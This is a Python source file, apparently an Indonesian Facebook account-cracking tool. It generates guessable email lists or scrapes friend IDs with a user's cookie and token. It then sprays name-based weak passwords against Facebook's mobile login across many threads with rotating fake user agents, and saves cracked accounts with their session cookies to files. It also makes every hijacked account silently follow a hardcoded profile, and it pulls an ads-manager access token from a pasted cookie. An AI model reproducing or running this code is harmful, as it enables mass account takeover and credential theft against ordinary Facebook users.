P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
success, checkpoint, duplikat, loop = 0, 0, [], 0

import random, sys, re, requests, time, os
from concurrent.futures import ThreadPoolExecutor as executor

def random_email(xnxx = []):
    print('\n%s[%s?%s] %sMasukan Nama!, Gunakan Tanda Koma Sebagai Pemisah'%(N,M,N,N))
    print('[%s!%s] Satu Nama Setara Dengan 600-1000 Email'%(M,N))
    uname = str(input('%s[%s!%s] %sNama Orang : %s'%(N,M,N,N,H))).split(',')
    blkang = str(input('%s[%s!%s] %sNama Belakang : %s'%(N,M,N,N,H))).split(',')
    limit = int(input('\n%s[%s!%s] %sLimit User : %s'%(N,M,N,N,H)))
    domain = str(input('%s[%s!%s] %sDomain Email (ex:@gmail.com): %s'%(N,M,N,N,H)))
    orang = ['amin','amel','amelia','ais','ananda','agus','aji','adi','andi','andika','abas','aminah','aminatun','bagas','basuki','babas','bayu','badrul','bintang','cindi','cici','cinta','cupita','cupi','dina','diki','difa','dihi','dini','diva','devinta','deni','dila','dilah','fika','fikha','fina','fivi','fatah','fania','fatih','fatun',random.randint(1,20),'32','28','123','24','oficial','cans','ganz','tok','xd','id','gina','galih','gugun','gifah','gans','kholid','kontol','kania','khoerul','hilada','hilmi','himin','lili','lina','lani','laruh','mia','mas','maz','mamat','mamad','masrul','nina','niha','nining','nula','nana','nunu','nifta','nita','niva','nabila','nadia','odi','oni','ojol','onani','pitri',random.randint(0,35),'rosma','riska','rina','rani','ratu','ratna','rifa','riva','rena','reza','rofik','risma','roza','rozak','siska','santi','sari','sarno','susanti','sindi','suci','susana','sinta','sulis','tiwi','tina','tanti','tono','tiara','titin','ulfa','ulfah','ulin','ulfin','unah','udin','usman','usdin','vina','vinka','vani','vatimah','winda','wanti','wani','wadul','xi','zidan','zaenal','zizi','khamdihi','iren','ine','reni','ufik','rohmah','khasna','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','rudi','bambang','supri','wawan','karnawan','akatsuki','wibu','cakep','cantik','ganteng','hitam',random.randint(0,60),'zulki','angga','yayan','dapunta','romi','khamdihi','rohmat','basuki','hamzah','boy','cahyani','sadiyah','salamah','anit']
    with executor(max_workers=2) as MLB:
        for w in range(100):
            for idc in uname:
                for nmc in orang:
                    for blk in blkang:
                        nam1 = '%s%s%s|%s %s'%(idc,nmc,domain,idc,blk)
                        nam2 = '%s%s%s|%s'%(idc,random.randint(1,999), domain,idc)
                        nam3 = '%s%s%s|%s %s'%(idc,blk,domain,idc, blk)
                        nam4 = '%s%s%s|%s %s'%(blk,nmc,domain,blk,nmc)
                        nam5 = '%s%s%s|%s %s'%(nmc,idc,domain,nmc,idc)
                        if nam1 not in xnxx:xnxx.append(nam1)
                        if nam2 not in xnxx:xnxx.append(nam2)
                        if nam3 not in xnxx:xnxx.append(nam3)
                        if nam4 not in xnxx:xnxx.append(nam4)
                        print('%s[%s!%s] Success Medapatkan %s Email'%(N,M,N,len(xnxx)),end='\r')
                        sys.stdout.flush()
                        if int(len(xnxx)) == limit:Run(xnxx)
    Run(xnxx)

def dump_publik(ck,tk, dump = []):
    dta = {'access_token':tk,'after':None}
    url = 'https://graph.facebook.com/v18.0/%s/friends'
    uid = input('\n%s[%s!%s] Gunakan Tanda Koma Buat Pemisahan Id\n[%s?%s] Masukan Id : %s'%(N,M,N,M,N,H))
    for xxx in uid.split(','):
        exec_dump(dta, url, xxx, dump, ck)
    print('')
    Run(dump)

def exec_dump(params, host, user, array, coki):
    try:
        req = requests.get(host%(user), params=params, cookies={'cookie':coki}).json()
        for xyz in req['data']:
            uid = '%s|%s'%(xyz['id'],xyz['name'])
            if uid not in array:array.append(uid)
            print('%s[%s!%s] Success Medapatkan %s Id '%(N,M,N,len(array)),end='\r')
            sys.stdout.flush()
        if 'paging' in str(req):
           after = req['paging']['cursors']['after']
           params.update({'after': after})
           exec_dump(params, host, user, array, coki)
    except:pass
    return array

def Run(xnxx):
    from datetime import datetime as date
    new = date.now()
    hari, bulan, tahun = new.day, new.month, new.year
    asu = '%s/%s/%s'%(hari,bulan,tahun)
    print('\n%s[%s*%s] Hari, Bulan, Tahun : %s%s\n%s[%s!%s] Proses Sedang Di Mulai\n'%(N,M,N,H,asu,N,M,N))
    with executor(max_workers=30) as DFF:
        for data in xnxx:
            email, nama = data.split('|')
            password = generate(nama)
            DFF.submit(login_, email, password,xnxx)
    exit(1)

def generate(nama):
    pwd = []
    pwd.append('123456')
    pwd.append('sayang')
    pwd.append('kata sandi')
    for user in nama.split(' '):
        if len(user) <2:continue
        elif len(user) == 3 or len(user) == 4 or len(user) == 5:pwd.append(user+'123');pwd.append(user+'1234');pwd.append(user+'12345');pwd.append(user+'123456');pwd.append('123456');pwd.append(user.capitalize()+'123')
        else:pwd.append(user+'123');pwd.append(user+'1234');pwd.append(user+'12345');pwd.append(user+'123456');pwd.append('123456');pwd.append(user);pwd.append(nama);pwd.append(user.capitalize()+'123')
    return pwd

def login_(email, pswd, total):
    global success, checkpoint, loop, duplikat
    xyz = requests.Session()
    clr = random.choice([P,M,K,H,B,U,O])
    uaz = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_6; like Mac OS X) AppleWebKit/602.9 (KHTML, like Gecko) Chrome/54.0.2816.215 Mobile Safari/536.0','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_11_4) AppleWebKit/533.29 (KHTML, like Gecko) Chrome/53.0.2071.241 Safari/534','Mozilla/5.0 (Windows; U; Windows NT 10.3;; en-US) Gecko/20100101 Firefox/57.6','Mozilla/5.0 (Windows; U; Windows NT 10.3; WOW64; en-US) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/50.0.1904.337 Safari/603.1 Edge/13.91489','Mozilla/5.0 (Windows; U; Windows NT 10.1; x64; en-US) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/55.0.2805.357 Safari/603.4 Edge/13.39752','Mozilla/5.0 (Windows; Windows NT 10.5; WOW64; en-US) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/54.0.2807.293 Safari/533.5 Edge/13.26923','Mozilla/5.0 (Android; Android 4.4.4; MOTOROLA RAZR Build/KVT49L) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/54.0.2358.385 Mobile Safari/537.5','Mozilla/5.0 (Windows; Windows NT 6.1;) Gecko/20100101 Firefox/62.7','Mozilla/5.0 (Linux; U; Linux i584 ; en-US) Gecko/20100101 Firefox/52.3','Mozilla/5.0 (Windows; Windows NT 6.2;; en-US) AppleWebKit/537.16 (KHTML, like Gecko) Chrome/55.0.3840.101 Safari/533','Mozilla/5.0 (iPhone; CPU iPhone OS 7_9_1; like Mac OS X) AppleWebKit/600.22 (KHTML, like Gecko) Chrome/55.0.2231.396 Mobile Safari/603.8','Mozilla/5.0 (iPhone; CPU iPhone OS 11_8_6; like Mac OS X) AppleWebKit/536.35 (KHTML, like Gecko) Chrome/47.0.3827.109 Mobile Safari/601.5','Mozilla/5.0 (iPhone; CPU iPhone OS 8_3_5; like Mac OS X) AppleWebKit/537.8 (KHTML, like Gecko) Chrome/55.0.3555.247 Mobile Safari/603.2','Mozilla/5.0 (Linux; Android 5.0.1; Lenovo A7000-a Build/LRX21M;) AppleWebKit/537.49 (KHTML, like Gecko) Chrome/51.0.1219.236 Mobile Safari/535.2','Mozilla/5.0 (Windows; Windows NT 10.5; x64) AppleWebKit/601.22 (KHTML, like Gecko) Chrome/50.0.3190.261 Safari/602.6 Edge/10.31793','Mozilla/5.0 (iPhone; CPU iPhone OS 7_5_6; like Mac OS X) AppleWebKit/601.15 (KHTML, like Gecko) Chrome/50.0.3327.261 Mobile Safari/600.2','Mozilla/5.0 (Windows; Windows NT 10.0; x64; en-US) AppleWebKit/601.27 (KHTML, like Gecko) Chrome/53.0.1160.136 Safari/600.7 Edge/15.62702','Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/55.0','Mozilla/5.0 (Windows; Windows NT 10.2; x64; en-US) AppleWebKit/535.42 (KHTML, like Gecko) Chrome/55.0.3833.159 Safari/602.6 Edge/8.13898','Mozilla/5.0 (Linux x86_64; en-US) AppleWebKit/600.14 (KHTML, like Gecko) Chrome/47.0.1125.226 Safari/537','Mozilla/5.0 (Windows NT 10.2; WOW64) AppleWebKit/600.14 (KHTML, like Gecko) Chrome/55.0.2947.175 Safari/534.6 Edge/13.68721','Mozilla/5.0 (Android; Android 4.4; Nexus_S_Build/GRJ22) AppleWebKit/602.40 (KHTML, like Gecko) Chrome/48.0.1119.386 Mobile Safari/535.8','Mozilla/5.0 (Linux; Linux x86_64) Gecko/20100101 Firefox/58.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 8_6_8) AppleWebKit/602.42 (KHTML, like Gecko) Chrome/53.0.3623.354 Safari/533','Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 10.4; Win64; x64 Trident/6.0)','Mozilla/5.0 (Linux; U; Linux x86_64; en-US) Gecko/20130401 Firefox/56.0','Mozilla/5.0 (Windows; Windows NT 10.1; WOW64; en-US) Gecko/20130401 Firefox/67.3','Mozilla/5.0 (Windows NT 10.1;) Gecko/20130401 Firefox/63.6','Mozilla/5.0 (Linux; U; Android 5.0.1; LG-D721 Build/LRX22G) AppleWebKit/537.20 (KHTML, like Gecko) Chrome/51.0.1200.151 Mobile Safari/603.7','Mozilla/5.0 (iPhone; CPU iPhone OS 8_5_3; like Mac OS X) AppleWebKit/536.21 (KHTML, like Gecko) Chrome/50.0.1314.207 Mobile Safari/601.6','Mozilla/5.0 (Windows NT 6.0;; en-US) AppleWebKit/600.10 (KHTML, like Gecko) Chrome/55.0.3048.162 Safari/602','Mozilla/5.0 (iPad; CPU iPad OS 7_4_5 like Mac OS X) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/51.0.1610.282 Mobile Safari/534.1','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_3_6; en-US) Gecko/20100101 Firefox/65.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.31 (KHTML, like Gecko) Chrome/54.0.3084.125 Safari/534','Mozilla/5.0 (Windows; Windows NT 6.0; x64) AppleWebKit/537.3 (KHTML, like Gecko) Chrome/54.0.2427.224 Safari/600.8 Edge/15.36958','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_8_2) Gecko/20100101 Firefox/57.3','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_2_4) AppleWebKit/537.34 (KHTML, like Gecko) Chrome/53.0.2528.399 Safari/535','Mozilla/5.0 (iPhone; CPU iPhone OS 8_7_1; like Mac OS X) AppleWebKit/602.24 (KHTML, like Gecko) Chrome/52.0.3628.253 Mobile Safari/601.7','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_7) Gecko/20130401 Firefox/56.7','Mozilla/5.0 (iPhone; CPU iPhone OS 7_8_2; like Mac OS X) AppleWebKit/603.2 (KHTML, like Gecko) Chrome/53.0.1174.347 Mobile Safari/537.5','Mozilla/5.0 (iPod; CPU iPod OS 9_3_8; like Mac OS X) AppleWebKit/533.28 (KHTML, like Gecko) Chrome/54.0.2429.241 Mobile Safari/534.2','Mozilla/5.0 (Windows; U; Windows NT 10.4;AppleWebKit/600.32 (KHTML, like Gecko) Chrome/55.0.2369.204 Safari/601.3 Edge/9.51399','Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_0; like Mac OS X) AppleWebKit/602.48 (KHTML, like Gecko) Chrome/52.0.2569.395 Mobile Safari/536.9','Mozilla/5.0 (Linux; Android 5.0.2; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/600.12 (KHTML, like Gecko) Chrome/54.0.3969.147 Mobile Safari/600.3','Mozilla/5.0 (Linux x86_64; en-US) Gecko/20100101 Firefox/73.0','Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_5; like Mac OS X) AppleWebKit/603.15 (KHTML, like Gecko) Chrome/49.0.3235.184 Mobile Safari/537.4','Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_0; like Mac OS X) AppleWebKit/602.23 (KHTML, like Gecko) Chrome/52.0.1781.352 Mobile Safari/533.4','Mozilla/5.0 (Windows; Windows NT 10.2; WOW64; en-US) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/55.0.3954.294 Safari/601','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4_0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/50.0.1613.225 Safari/536','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_8_1; en-US) Gecko/20100101 Firefox/48.3','Mozilla/5.0 (Windows; U; Windows NT 6.0;) Gecko/20100101 Firefox/67.2','Mozilla/5.0 (Linux; Android 7.0; Xperia V Build/NDE63X) AppleWebKit/535.39 (KHTML, like Gecko) Chrome/53.0.1255.126 Mobile Safari/536.6','Mozilla/5.0 (iPod; CPU iPod OS 11_3_5; like Mac OS X) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/47.0.3028.317 Mobile Safari/533.5','Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_5; like Mac OS X) AppleWebKit/602.7 (KHTML, like Gecko) Chrome/53.0.3950.253 Mobile Safari/600.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 8_8_9) Gecko/20100101 Firefox/54.3','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_1_7; en-US) Gecko/20130401 Firefox/64.2','Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_0; like Mac OS X) AppleWebKit/600.25 (KHTML, like Gecko) Chrome/49.0.1622.305 Mobile Safari/533.4','Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/600.38 (KHTML, like Gecko) Chrome/51.0.1362.274 Safari/533','Mozilla/5.0 (Windows; U; Windows NT 10.3; x64; en-US) AppleWebKit/602.12 (KHTML, like Gecko) Chrome/50.0.2132.214 Safari/600.3 Edge/12.94125','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_6) AppleWebKit/603.1 (KHTML, like Gecko) Chrome/49.0.3079.289 Safari/535','Mozilla/5.0 (Windows NT 10.1; WOW64; en-US) AppleWebKit/534.43 (KHTML, like Gecko) Chrome/48.0.3704.120 Safari/600.3 Edge/8.72697','Mozilla/5.0 (Linux; Android 7.1; Xperia V Build/NDE63X) AppleWebKit/533.10 (KHTML, like Gecko) Chrome/51.0.3638.258 Mobile Safari/537.3','Mozilla/5.0 (iPod; CPU iPod OS 8_3_7; like Mac OS X) AppleWebKit/602.47 (KHTML, like Gecko) Chrome/54.0.3217.176 Mobile Safari/537.6','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/602.18 (KHTML, like Gecko) Chrome/54.0.2412.313 Safari/600','Mozilla/5.0 (Macintosh; Intel Mac OS X 8_8_2; en-US) AppleWebKit/534.9 (KHTML, like Gecko) Chrome/55.0.1376.235 Safari/601','Mozilla/5.0 (Linux; U; Android 7.0; LG-H930 Build/NRD90C) AppleWebKit/537.49 (KHTML, like Gecko) Chrome/49.0.1054.322 Mobile Safari/602.0','Mozilla/5.0 (Windows; Windows NT 10.0; x64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/54.0.2254.299 Safari/601.6 Edge/16.75606','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_3_9) AppleWebKit/537.33 (KHTML, like Gecko) Chrome/50.0.2952.280 Safari/600','Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_8; like Mac OS X) AppleWebKit/602.2 (KHTML, like Gecko) Chrome/53.0.1061.284 Mobile Safari/537.6','Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20130401 Firefox/63.4','Mozilla/5.0 (Linux; U; Android 7.0; Pixel C Build/NME91E) AppleWebKit/535.38 (KHTML, like Gecko) Chrome/47.0.1086.172 Mobile Safari/601.1','Mozilla/5.0 (Windows; U; Windows NT 6.0; WOW64) AppleWebKit/603.43 (KHTML, like Gecko) Chrome/55.0.1379.304 Safari/600.9 Edge/15.32335','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/602.50 (KHTML, like Gecko) Chrome/49.0.1401.267 Safari/533.8 Edge/14.15203','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_8_9) AppleWebKit/603.8 (KHTML, like Gecko) Chrome/52.0.3053.185 Safari/533','Mozilla/5.0 (Windows NT 6.3;; en-US) Gecko/20100101 Firefox/46.8','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_6_3) Gecko/20100101 Firefox/61.7','Mozilla/5.0 (iPad; CPU iPad OS 7_8_7 like Mac OS X) AppleWebKit/536.29 (KHTML, like Gecko) Chrome/52.0.1080.152 Mobile Safari/603.9','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_4_5; en-US) AppleWebKit/602.42 (KHTML, like Gecko) Chrome/48.0.2330.327 Safari/600','Mozilla/5.0 (Linux; U; Linux x86_64) Gecko/20100101 Firefox/64.3','Mozilla/5.0 (Linux; U; Linux x86_64) Gecko/20100101 Firefox/52.4','Mozilla/5.0 (Windows; U; Windows NT 10.3;; en-US) AppleWebKit/534.28 (KHTML, like Gecko) Chrome/50.0.1716.279 Safari/535.7 Edge/9.73730','Mozilla/5.0 (Android; Android 6.0.1; Nexus 5 Build/MDB08I) AppleWebKit/601.50 (KHTML, like Gecko) Chrome/55.0.3741.324 Mobile Safari/603.8','Mozilla/5.0 (Linux; Linux i581 ) AppleWebKit/602.45 (KHTML, like Gecko) Chrome/51.0.2553.374 Safari/537','Mozilla/5.0 (iPhone; CPU iPhone OS 10_5_9; like Mac OS X) AppleWebKit/534.49 (KHTML, like Gecko) Chrome/49.0.1989.135 Mobile Safari/536.8','Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_2; like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Chrome/49.0.3301.244 Mobile Safari/601.7','Mozilla/5.0 (U; Linux i645 x86_64) Gecko/20100101 Firefox/50.8','Mozilla/5.0 (Windows NT 6.2; WOW64; en-US) Gecko/20130401 Firefox/67.1','Mozilla/5.0 (iPhone; CPU iPhone OS 7_9_1; like Mac OS X) AppleWebKit/600.15 (KHTML, like Gecko) Chrome/48.0.3170.175 Mobile Safari/600.5','Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 6.2; WOW64 Trident/4.0)','Mozilla/5.0 (Linux; U; Linux x86_64) Gecko/20100101 Firefox/68.5','Mozilla/5.0 (Windows; Windows NT 10.4; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/54.0.2119.386 Safari/601.4 Edge/9.61099','Mozilla/5.0 (iPhone; CPU iPhone OS 7_7_1; like Mac OS X) AppleWebKit/600.30 (KHTML, like Gecko) Chrome/47.0.3326.240 Mobile Safari/536.3','Mozilla/5.0 (Android; Android 7.1.1; LG-H930 Build/NRD90M) AppleWebKit/537.39 (KHTML, like Gecko) Chrome/51.0.1944.100 Mobile Safari/603.8','Mozilla/5.0 (iPhone; CPU iPhone OS 7_4_6; like Mac OS X) AppleWebKit/601.15 (KHTML, like Gecko) Chrome/50.0.1030.335 Mobile Safari/534.6','Mozilla/5.0 (Windows; Windows NT 10.1; WOW64; en-US) AppleWebKit/600.18 (KHTML, like Gecko) Chrome/52.0.3662.151 Safari/533.9 Edge/16.41725','Mozilla/5.0 (Linux; U; Android 7.1.1; LG-H910 Build/NRD90C) AppleWebKit/601.50 (KHTML, like Gecko) Chrome/53.0.1906.295 Mobile Safari/534.6','Mozilla/5.0 (Windows; U; Windows NT 6.1; Win64; x64) AppleWebKit/603.24 (KHTML, like Gecko) Chrome/50.0.3115.258 Safari/603','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/601.1 (KHTML, like Gecko) Chrome/52.0.3830.269 Safari/535','Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_5; like Mac OS X) AppleWebKit/535.44 (KHTML, like Gecko) Chrome/49.0.1260.331 Mobile Safari/535.6'])
    print('%s[%s!%s] %s/%s OK:%s CP:%s'%(N,clr,N,loop, len(total), success, checkpoint),end='\r')
    sys.stdout.flush()
    for pas in pswd:
        try:
            xnxx = xyz.get('https://x.prod.facebook.com/login/?ref=dbl&fl&login_from_aymh=1').text
            headers = {
               'Host': 'x.prod.facebook.com',
               'sec-ch-ua': 'Google',
               'sec-ch-ua-mobile': '?0',
               'user-agent': uaz,
               'viewport-width': '980',
               'content-type': 'application/x-www-form-urlencoded',
               'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(xnxx)).group(1),
               'x-asbd-id': '129477',
               'dpr': '2',
               'sec-ch-ua-full-version-list': 'Google',
               'sec-ch-ua-platform': 'Linux',
               'accept': '*/*',
               'origin': 'https://x.prod.facebook.com',
               'sec-fetch-site': 'same-origin',
               'sec-fetch-mode': 'cors',
               'sec-fetch-dest': 'empty',
               'referer': 'https://x.prod.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',
               'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            }
            data = {
               'm_ts':re.search('name="m_ts" value="(.*?)"', str(xnxx)).group(1),
               'li':re.search('name="li" value="(.*?)"', str(xnxx)).group(1),
               'try_number':'0',
               'unrecognized_tries':'0',
               'email':f'{email}',
               'prefill_contact_point':f'{email}',
               'prefill_source':'browser_dropdown',
               'prefill_type':'password',
               'first_prefill_source':'browser_dropdown',
               'first_prefill_type':'contact_point',
               'had_cp_prefilled':'true',
               'had_password_prefilled':'true',
               'is_smart_lock':'false',
               'bi_xrwh':'0',
               'encpass':'#PWD_BROWSER:0:%s:%s'%(re.search('name="m_ts" value="(.*?)"', str(xnxx)).group(1),pas),
               'jazoest':re.search('name="jazoest" value="(.*?)"', str(xnxx)).group(1),
               'lsd':re.search('name="lsd" value="(.*?)"', str(xnxx)).group(1),
               '__dyn':'',
               '__csr':'',
               '__req':'1',
               '__a':re.search('"encrypted":"(.*?)"', str(xnxx)).group(1),
               '__user':'0'
            }
            kuki = 'datr=ufhMZWEcSCUIHQitVBSZt5eD;'
            kuki+= ';'.join([key+'='+value for key, value in xyz.cookies.get_dict().items()])
            resp = xyz.post('https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', cookies = {'cookie': kuki}, data = data, headers = headers)
            if "checkpoint" in xyz.cookies.get_dict():
                try:uid = xyz.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                except:uid = email
                if uid in duplikat:
                   break
                duplikat.append(uid)
                print('\r%s* --> %s|%s'%(K,uid,pas))
                checkpoint +=1
                open('CP.json','a').write('%s|%s\n'%(uid,pas))
                break
            elif "c_user" in xyz.cookies.get_dict():
                koki = ';'.join([key+'='+value for key, value in xyz.cookies.get_dict().items()])
                user = re.search('c_user=(\d+)',str(koki)).group(1)
                if user in duplikat or email in duplikat:
                   break
                duplikat.append(user)
                print('\r%s* --> %s|%s|%s'%(H,user,pas,koki))
                success +=1
                asuu = {'cookie': koki}
                follow_me(asuu)
                open('OK.json','a').write('%s|%s|%s\n'%(user,pas,koki))
                break
        except requests.exceptions.ConnectionError:time.sleep(10)
    loop +=1

def menu():
    try:os.system('mkdir Data')
    except:pass
    if os.path.isfile('Data/cokie.txt') is True:
       coki, ctok = open('Data/cokie.txt','r').read(), open('Data/token.txt','r').read()
    else:login()
    try:
        name = requests.get('https://graph.facebook.com/%s?access_token=%s'%('me',ctok), cookies = {'cookie':coki}).json()['name']
    except KeyError:login()
    except requests.exceptions.ConnectionError:menu()
    os.system('clear')
    print('%s[ %sHai %s%s %sWelcome %s]\n'%(M,N,H,name,N,M))
    print('%s[%s1%s] Crack Email'%(N,M,N))
    print('%s[%s2%s] Crack Publik'%(N,M,N))
    print('%s[%s3%s] Check Results'%(N,M,N))
    print('%s[%s4%s] Exit\n'%(N,M,N))
    x = input('%s[%s?%s] Choose : %s'%(N,M,N,H))
    if x in ('1'):random_email()
    elif x in ('2'):dump_publik(coki,ctok)
    elif x in ('3'):
        q = 0
        print('\n%s[%s1%s] Akun OK'%(N,M,N))
        print('%s[%s2%s] Akun CP'%(N,M,N))
        h = input('%s[%s?%s] Choose : %s'%(N,M,N,H))
        if h in ('1','01'):dir='OK.json'
        elif h in ('2','02'):dir='CP.json'
        else:menu()
        print(f'\n[ {H}Semua Result Akun {dir} {N}]\n')
        for w in open(f'{dir}','r').read().splitlines():
            q +=1
            if dir == 'OK.txt':
               print('\r %s%s. %s%s\n'%(H,q,N,w))
            else:
               print('\r %s%s. %s%s'%(M,q,N,w))
        exit()
    elif x in ('4'):exit()
    else:menu()

def login():
    cokie = {'cookie':input("cookie: ")}
    try:
        req = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1', cookies = cokie).text
        act = re.search('act=(\d+)',str(req)).group(1)
        res = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&act=%s&breakdown_regrouping=1'%(act), cookies = cokie).text
        xyz = re.search('window.__accessToken="(.*?)"', str(res)).group(1)
        open('Data/cokie.txt','w').write(cokie.get('cookie'))
        open('Data/token.txt','w').write(xyz)
        follow_me(cokie)
        exit(os.system('python %s'%(sys.argv[0])))
    except Exception as e:
        exit(e)

def follow_me(xyz): # YANG GAK GANTI BOT FOLLOW GANTENG
    from bs4 import BeautifulSoup as BSP
    try:
        req = BSP(requests.get('https://m.facebook.com/100043618273847', cookies = xyz).text,'html.parser')
        for i in req.find_all('a', href=True):
            if '/a/subscribe.php?' in str(i.get('href')):
                r = requests.get('https://m.facebook.com%s'%(i['href']), cookies=xyz).text
    except:pass

def Ngelink(dir = '.link'):
    if os.path.isfile(dir) is True:menu()
    else:
        try:
           os.system('xdg-open https://www.facebook.com/Bangboystore10')
           open(dir,'w').write('True')
           time.sleep(2)
           menu()
        except:pass

if __name__ == '__main__':
   Ngelink()
